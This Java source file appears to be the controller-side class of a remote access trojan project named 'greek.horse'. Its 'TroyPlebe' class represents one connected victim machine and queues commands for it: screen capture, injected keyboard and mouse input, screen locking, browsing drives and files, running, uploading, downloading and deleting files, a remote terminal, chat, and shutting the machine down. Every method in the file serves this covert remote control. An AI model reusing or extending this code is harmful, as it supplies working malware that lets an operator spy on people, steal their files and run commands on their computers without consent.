package greek.horse.server.troyStructure;

import greek.horse.models.*;
import greek.horse.server.troyStructure.request.RecurrentTroyRequest;
import greek.horse.server.troyStructure.request.TroyRequest;
import greek.horse.server.troyStructure.request.UniqueTroyRequest;
import greek.horse.server.ui.controllers.tasks.ChatTask;
import greek.horse.server.ui.controllers.tasks.MonitorDesktopTask;
import greek.horse.server.ui.controllers.tasks.TerminalTask;

import java.io.Serializable;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;

public class TroyPlebe {
    private final String id;
    private String title;
    private final AtomicBoolean running = new AtomicBoolean(true);
    private CopyOnWriteArrayList<TroyRequest> requests = new CopyOnWriteArrayList<>();
    private static final Serializable EMPTY = "";

    private ChatTask chatTask = new ChatTask(this);
    private MonitorDesktopTask monitorDesktopTask = new MonitorDesktopTask(this);
    private TerminalTask terminalTask = new TerminalTask(this);

    public TroyPlebe(String id) {
        this.id = id;
    }

    public void setRunning(boolean value) {
        this.running.set(value);
        if (!running.get()) {
            requests.clear();
            new Thread(() -> {
                try {
                    Thread.sleep(30 * 1000);
                    requests = null;
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }).start();
        }
    }

    public void removeRequest(UniqueTroyRequest req) {
        requests.remove(req);
    }

    public UniqueTroyRequest getNetInfo() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.NET_INFO, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest getDisconnect() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.DISCONNECT, false);
        requests.add(req);
        return req;
    }

    public void doStop() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.STOP, false);
        requests.add(req);
    }

    public void doToggleLock(boolean lock) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, lock, RequestFunctionType.LOCK, false);
        requests.add(req);
    }

    public RecurrentTroyRequest startScreenCapture(MonitorDesktopWrapper wrapper) {
        RecurrentTroyRequest req = new RecurrentTroyRequest(wrapper, RequestFunctionType.DESKTOP_START);
        requests.add(req);
        return req;
    }

    public void sendUserInputs(ArrayList<UserInput> inputs) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, inputs, RequestFunctionType.USER_INPUT, false);
        requests.add(req);
    }

    public boolean haveRequest(UniqueTroyRequest req) {
        return requests.contains(req);
    }

    public AtomicBoolean getRunning() {
        return running;
    }

    public String getId() {
        return id;
    }

    public List<TroyRequest> getRequests() {
        return Collections.unmodifiableList(requests);
    }

    public UniqueTroyRequest getDrives() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(BrowserTicketType.LOAD_DRIVES), RequestFunctionType.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest getFiles(Path dir) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(dir.toString(), BrowserTicketType.LOAD_FILES), RequestFunctionType.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest runFile(Path path) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.RUN), RequestFunctionType.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest uploadFile(Path path, String fileName, byte[] bytes) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.UPLOAD, fileName, bytes), RequestFunctionType.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest getKnownFolders() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(BrowserTicketType.KNOWN_FOLDERS), RequestFunctionType.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest deleteFile(Path path) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.DELETE), RequestFunctionType.FILES, true);
        requests.add(req);
        return req;
    }

    public UniqueTroyRequest downloadFile(Path path) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.DOWNLOAD), RequestFunctionType.FILES, true);
        requests.add(req);
        return req;
    }

    public TroyRequest startTerminal() {
        RecurrentTroyRequest req = new RecurrentTroyRequest(EMPTY, RequestFunctionType.TERMINAL_START);
        requests.add(req);
        return req;
    }

    public Object startChat() {
        RecurrentTroyRequest req = new RecurrentTroyRequest(EMPTY, RequestFunctionType.CHAT_START);
        requests.add(req);
        return req;
    }

    public void sendTerminalCommand(String command) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, command, RequestFunctionType.TERMINAL_COMMAND, false);
        requests.add(req);
    }

    public void sendChatMessage(String message) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, message, RequestFunctionType.CHAT_MESSAGE, false);
        requests.add(req);
    }

    public void releaseRequest(RecurrentTroyRequest request) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, request.getTicket().getId(), RequestFunctionType.RELEASE, false);
        requests.add(req);
        request.getReleased().set(true);
    }

    public void refreshDesktop(MonitorDesktopWrapper wrapper) {
        UniqueTroyRequest req = new UniqueTroyRequest(this, wrapper, RequestFunctionType.DESKTOP_REFRESH, false);
        requests.add(req);
    }

    public void turnOff() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.TURN_OFF, false);
        requests.add(req);
    }

    public UniqueTroyRequest getMonitorCount() {
        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.MONITOR_COUNT, true);
        requests.add(req);
        return req;
    }



    @Override
    public String toString() {
        return "TroyPlebe{" +
                "id=" + id +
                ", running=" + running.get() +
                ", requests size =" + requests.size() +
                '}';
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        TroyPlebe troyPlebe = (TroyPlebe) o;
        return id.equals(troyPlebe.id);
    }

    @Override
    public int hashCode() {
        return Objects.hash(id);
    }

    public String getTitle() {
        return title;
    }

    public void setTitle(String title) {
        this.title = title;
    }

    public ChatTask getChatTask() {
        return chatTask;
    }

    public MonitorDesktopTask getMonitorDesktopTask() {
        return monitorDesktopTask;
    }

    public TerminalTask getTerminalTask() {
        return terminalTask;
    }
}
